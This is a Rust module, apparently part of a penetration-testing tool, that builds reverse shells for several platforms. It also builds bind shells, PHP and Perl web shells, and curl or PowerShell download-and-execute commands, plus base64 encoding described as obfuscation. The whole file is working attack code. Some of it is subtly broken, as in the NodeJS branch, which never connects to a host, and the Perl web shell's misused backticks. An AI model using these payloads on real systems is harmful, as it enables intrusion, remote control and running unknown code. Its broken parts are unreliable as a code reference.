//! Payload generator module
//! Reverse shells, bind shells, web shells, and encoded payloads.

use base64::Engine;
use base64::engine::general_purpose::STANDARD as BASE64;
use rand::Rng;

/// Supported payload types
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum PayloadType {
    ReverseShell,
    BindShell,
    WebShell,
    DownloadExec,
}

/// Supported platforms
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum Platform {
    Linux,
    Windows,
    MacOS,
    PHP,
    Python,
    NodeJS,
    Ruby,
    Perl,
}

/// Generate a reverse shell payload
pub fn generate_reverse_shell(lhost: &str, lport: u16, platform: Platform) -> String {
    match platform {
        Platform::Linux => {
            format!(
                "bash -i >& /dev/tcp/{}/{} 0>&1",
                lhost, lport
            )
        }
        Platform::Windows => {
            let ps_cmd = format!(
                "$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
                lhost, lport
            );
            BASE64.encode(ps_cmd.as_bytes())
        }
        Platform::MacOS => {
            format!("bash -i >& /dev/tcp/{}/{} 0>&1", lhost, lport)
        }
        Platform::Python => {
            format!(
                "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                lhost, lport
            )
        }
        Platform::PHP => {
            format!(
                "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                lhost, lport
            )
        }
        Platform::NodeJS => {
            format!(
                "node -e 'require(\"child_process\").spawn(\"/bin/sh\", { stdio: [0,1,2] }).on(\"error\", console.error);'",
            )
        }
        Platform::Ruby => {
            format!(
                "ruby -rsocket -e 'c=TCPSocket.new(\"{}\",{});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
                lhost, lport
            )
        }
        Platform::Perl => {
            format!(
                "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
                lhost, lport
            )
        }
    }
}

/// Generate a bind shell payload
pub fn generate_bind_shell(lport: u16, platform: Platform) -> String {
    match platform {
        Platform::Linux => {
            format!("nc -lvp {} -e /bin/bash", lport)
        }
        Platform::Windows => {
            let ps_cmd = format!(
                "$listener = New-Object System.Net.Sockets.TCPListener('0.0.0.0',{});$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
                lport
            );
            BASE64.encode(ps_cmd.as_bytes())
        }
        Platform::Python => {
            format!(
                "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                lport
            )
        }
        _ => "Bind shell not implemented for this platform".to_string(),
    }
}

/// Generate a simple PHP web shell
pub fn generate_php_webshell(password: &str) -> String {
    format!(
        r#"<?php
$pass = '{}';
if ($_POST['pass'] == $pass) {{
    echo '<pre>';
    system($_POST['cmd']);
    echo '</pre>';
}}
?>"#,
        password
    )
}

/// Generate a Perl web shell
pub fn generate_perl_webshell() -> String {
    r#"#!/usr/bin/perl
use CGI;
$q = CGI->new;
print $q->header('text/html');
if ($q->param('cmd')) {
    print `<pre>`.$q->param('cmd').`</pre>`;
}"#.to_string()
}

/// Generate a download and execute payload
pub fn generate_download_exec(url: &str, platform: Platform) -> String {
    match platform {
        Platform::Linux => {
            format!(
                "curl -s {} -o /tmp/payload && chmod +x /tmp/payload && /tmp/payload",
                url
            )
        }
        Platform::Windows => {
            format!(
                "powershell -Command \"Invoke-WebRequest -Uri {} -OutFile %TEMP%\\payload.exe; Start-Process %TEMP%\\payload.exe\"",
                url
            )
        }
        _ => "Download/exec not implemented".to_string(),
    }
}

/// Encode a payload in base64 (for obfuscation)
pub fn encode_base64(payload: &str) -> String {
    BASE64.encode(payload.as_bytes())
}

/// URL-encode a payload
pub fn url_encode(payload: &str) -> String {
    urlencoding::encode(payload).to_string()
}

/// Generate a random password for web shell
pub fn random_webshell_password() -> String {
    let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".chars().collect();
    let mut rng = rand::thread_rng();
    (0..12).map(|_| *chars.choose(&mut rng).unwrap()).collect()
}

/// Get all supported platforms as strings
pub fn list_platforms() -> Vec<&'static str> {
    vec!["linux", "windows", "macos", "python", "php", "nodejs", "ruby", "perl"]
}

/// Get all payload types as strings
pub fn list_payload_types() -> Vec<&'static str> {
    vec!["reverse", "bind", "webshell", "downloadexec"]
}